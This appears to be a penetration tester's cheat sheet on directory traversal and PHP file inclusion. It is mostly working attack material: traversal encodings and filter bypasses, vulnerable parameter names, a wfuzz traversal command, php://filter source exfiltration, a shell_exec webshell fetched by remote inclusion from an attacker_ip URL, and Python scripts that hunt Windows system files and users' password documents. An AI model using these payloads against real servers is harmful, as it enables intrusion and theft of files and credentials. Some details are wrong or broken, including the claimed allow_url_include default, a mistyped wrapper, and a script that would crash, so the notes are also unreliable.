# File Inclusion And Directory Traversal

File Inclusion facilitation stems from Directory traversal vulnerabities. Directory traversal or path path traversal are identifiable by an ability to manipulate file paths with cli-esque: `../` or `..\` characters to change directory from the webpage beeing attacked. For [[Log-Poisoning]]

## Indication of Vulnerability
Locate parameteres and test for manipulation and arbitrary file reading.
1. URL query strings
	1. file extensions in URL query strings
1. Form bodies in search of values that appear as file references

Readable files by the `www-data` or account used to host the web server can be then be tested from the starting position of the web root directory such Linux's `/etc/passwd` or Window's `C:boot.ini`   

Warning messages can then reveal which functions are used in invalid parameter passing of one the above files.

## Traversal encoding:
Remember this is a guide to ideas of how to encode lfi, encoding payloads on the fly not from here.
```
../
..\
..\/
../etc/passwd\.\	# Path and dot truncation
../etc/passwd/./
%2e%2e%2f
%252e%252e%252f 	# Double encoding
%c0%ae%c0%ae%c0%af	# utf-8 encoding
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
....\
%00					# null byte
....////			# filter bypass
/%5C../%5C..

```

##  File inclusion Types
Local File Inclusion are occurent when the included file is present on the web server; Remote File Inclusion when a file is loaded from a remote source. Each is dependent of the language the  application is written in and server configuration.

For Windows files [[DT-FI-Windows-Files]]; for Linux files [[DT-FI-Linux-Files]]

## Indication of FIs
Locate parameteres and test for manipulation and arbitrary file execution.

Rabbit holes \/ Pitfalls:
1. Modern PHP versions disables remote URL includes
2. Routing and firewall rules regarding **ATTACKER PORT USAGE!** for connecting back to local attacking IP

## Testing
1. Invalid input
2. Regular page - index.php
3. Imply filter `php://filter/convert.base64-encode/resource=` to exfil php source code
4. Host a remote file and test for remote file inclusion
	1. Wrappers `http://`, `ftp://`
	2. `expect://`

## Vulnerable Functions 
Language | LFI/RFI | Function | Caveats | RTFM
--- | --- | --- | ---
[[Vulnerable-PHP-Functions]] | Both | `include()` | `badquery?file=` then `php://filter/convert.base64-encode/resources=` | https://www.php.net/manual/en/function.include.php

## Indictions of (L|R)FIs - Functions
#### PHP
```php
// php.ini values:
register_globals
allow_url
```
RFI
```php
allow_url_include # Modern default is On, but RFI if off
```
[Older PHP apps have nullbyte vulnerability](https://www.php.net/manual/en/security.filesystem.nullbytes.php) 

## Wrappers
#### PHP
[RTFM PHP Wrappers](https://www.php.net/manual/en/wrappers.php)
```php
?data:text/plain,<?php echo shell_exec("dir") ?>
?base64:
```

## Parametres
[Hacktricks reference TR Bug Hunters](https://twitter.com/trbughunters/status/1279768631845494787)
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

## Fuzz for files
```bash
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```

## Phpinfolfi

[[Webservers-PHP-Based-Commonalities]], and phpinfo pages contain both the configuration for whether uploads are enabled but also  PHP Variables section that be then check after attempting upload.

```
Content-Type: multipart/form-data; boundary=BadFileFromBurp
Content-Length: 0

----BadFileFromBurp
Content-Disposition: form-data; name="anything"; filename="BadFile"
Content-Type: text/plain

This is Bad File from burp that will appear in the PHP info page as_FILE["anything"]
----BadFileFromBurp
```

[Payload all the things](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py)



## RFI Local Serving Payloads
```php
<?php echo shell_exec($_GET['cmd']); ?>
# For similar:
# http://poor_web_server/bad.php?file=http://attacker_ip/evil.txt&cmd=whoami
```


## Appendix
Script LFI starting 
ON TODO LIST
[rapid7 blog](https://www.rapid7.com/blog/post/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/)

```python
import requests
import webbrowser
 
 
url = 'http://www.testpage.com?page='
 
LFI = '../../../../../../../../../'
 
pages = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
 
for x in pages:
                  check = requests.get(url + LFI + x)
                  if check.status_code == 200:
                                    webbrowser.open(url + LFI + x)

import requests
import webbrowser
 
 
url = 'http://www.testpage.com?page='
 
LFI = '../../../../../../../../../'
 
usernames = ['bob.jones', 'tom.johnson', 'mary.thomas', 'bill.smith']
 
desktopini = '/Desktop/desktop.ini'
 
usersfiles = ['accounts.txt', 'passwords.doc', 'configs.txt', 'sensitiveinfo.doc']
 
for x in usernames:
                  check = requests.get(url + LFI + x + desktopini)
                  if check.status_code == 200:
                                    print(‘User ’ + x + ‘was found’)
                                    desktopsearch = requests.get(url + LFI + '/Desktop/' + usersfiles)
                                    if desktopsearch.status_code == 200:
                                                      webbrowser.open(url + LFI + '/Desktop/' + usersfiles)
```
						


## References
[certcube](https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/)
[Kory Kyzar](https://gist.github.com/korrosivesec)
[rapid7](https://www.rapid7.com/blog/post/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/)
[Older PHP apps have nullbyte vulnerability](https://www.php.net/manual/en/security.filesystem.nullbytes.php) 
[RTFM PHP Wrappers](https://www.php.net/manual/en/wrappers.php)